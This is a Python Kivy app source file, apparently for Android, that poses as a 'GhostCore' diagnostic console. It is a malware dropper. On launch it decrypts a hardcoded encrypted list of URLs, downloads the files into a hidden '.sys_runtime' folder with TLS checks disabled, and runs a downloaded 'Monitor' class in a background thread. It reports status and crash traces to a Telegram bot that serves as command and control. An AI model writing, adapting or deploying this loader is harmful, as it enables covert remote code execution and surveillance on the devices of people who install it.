# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import traceback
import importlib.util
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'

ENCRYPTED_INDEX_BLOB = "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"

def decrypt_index(encrypted_blob):
    try:
        data = base64.b64decode(encrypted_blob)
        iv, tag, ciphertext = data[:12], data[12:28], data[28:]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return json.loads((decryptor.update(ciphertext) + decryptor.finalize()).decode())
    except Exception:
        return None

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID, ADMIN_PASSWORD
except ImportError:
    BOT_TOKENS = ["YOUR_BOT_TOKEN"]
    CONTROL_ID = "YOUR_CONTROL_ID"
    VAULT_ID = "YOUR_VAULT_ID"
    ADMIN_PASSWORD = "Zaen123@123@"

class GhostCoreApp(App):
    def build(self):
        self.log_history = []
        self.add_log("🚀 بدء تشغيل التطبيق...")
        root = BoxLayout(orientation='vertical', padding=5)
        self.console = TextInput(
            text="[GhostCore v2.0 - Diagnostic Mode]\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='12sp'
        )
        root.add_widget(self.console)
        Clock.schedule_once(self.run_engine, 0.5)
        return root

    def add_log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        entry = f"[{timestamp}] {msg}"
        self.log_history.append(entry)
        if hasattr(self, 'console') and self.console:
            self.console.text += entry + "\n"
        print(entry)

    def send_telegram(self, message, is_error=False):
        prefix = "❌ " if is_error else "✅ "
        full_msg = prefix + message[:4000]
        for token in BOT_TOKENS:
            try:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5, verify=False)
                break
            except Exception:
                continue

    def download_payloads(self):
        self.add_log("📥 Loading payload index...")
        index_data = decrypt_index(ENCRYPTED_INDEX_BLOB)
        if not index_data:
            self.add_log("❌ Failed to load payload index.")
            return
        file_urls = index_data.get('files', [])
        self.add_log(f"✅ Index loaded. Found {len(file_urls)} files.")
        for url in file_urls:
            name = url.split('/')[-1]
            self.add_log(f"⬇️ Downloading {name}...")
            try:
                resp = requests.get(url, timeout=15, verify=False)
                if resp.status_code == 200:
                    file_path = os.path.join(BASE_DIR, name)
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(resp.text)
                    self.add_log(f"✅ Downloaded {name}")
                else:
                    self.add_log(f"⚠️ Failed {name} (HTTP {resp.status_code})")
            except Exception as e:
                self.add_log(f"⚠️ Error downloading {name}: {str(e)[:100]}")
        self.add_log("🏁 Payload downloads finished.")

    def start_services(self):
        self.add_log("⚙️ محاولة استيراد Monitor ديناميكياً...")
        try:
            monitor_path = os.path.join(BASE_DIR, "monitor.py")
            if not os.path.exists(monitor_path):
                self.add_log(f"❌ ملف monitor.py غير موجود في {BASE_DIR}")
                return
            spec = importlib.util.spec_from_file_location("monitor", monitor_path)
            monitor_module = importlib.util.module_from_spec(spec)
            sys.modules["monitor"] = monitor_module
            spec.loader.exec_module(monitor_module)
            if hasattr(monitor_module, 'Monitor'):
                mon = monitor_module.Monitor()
                mon.admin_password = ADMIN_PASSWORD
                mon.bot_token = BOT_TOKENS[0]
                mon.control_id = CONTROL_ID
                mon.vault_id = VAULT_ID
                setattr(mon, 'bot_tokens', BOT_TOKENS)
                threading.Thread(target=mon.start, daemon=True).start()
                self.add_log("✅ تم تشغيل كلاس Monitor بنجاح!")
                self.send_telegram("🚀 Monitor is now active.")
            else:
                self.add_log("⚠️ الكلاس 'Monitor' غير موجود داخل ملف monitor.py")
        except Exception as e:
            error_trace = traceback.format_exc()
            self.add_log(f"❌ فشل تشغيل الخدمات: {str(e)}")
            self.add_log(error_trace[:500])
            self.send_telegram(f"Error starting services:\n{error_trace[:1000]}", is_error=True)

    def run_engine(self, dt):
        try:
            self.add_log("🔍 فحص بيئة التشغيل...")
            for folder in ['core', 'telegram', 'config', 'media']:
                exists = "✅" if os.path.isdir(folder) else "❌"
                self.add_log(f"Folder '{folder}': {exists}")
            import jnius
            self.add_log("✅ Pyjnius loaded")
            import cryptography
            self.add_log("✅ Cryptography loaded")
            self.download_payloads()
            self.start_services()
            self.add_log("🏁 اكتملت الفحوصات. التطبيق يعمل في الخلفية.")
            self.send_telegram("تم تشغيل التطبيق بنجاح على الجهاز.")
        except Exception as e:
            error_trace = traceback.format_exc()
            self.add_log(f"❌ خطأ جسيم:\n{error_trace}")
            self.send_telegram(f"انهيار عند التشغيل:\n{error_trace[:3000]}", is_error=True)

if __name__ == '__main__':
    try:
        GhostCoreApp().run()
    except Exception as e:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKENS[0]}/sendMessage",
                          json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"}, verify=False)
        except Exception:
            pass
        raise
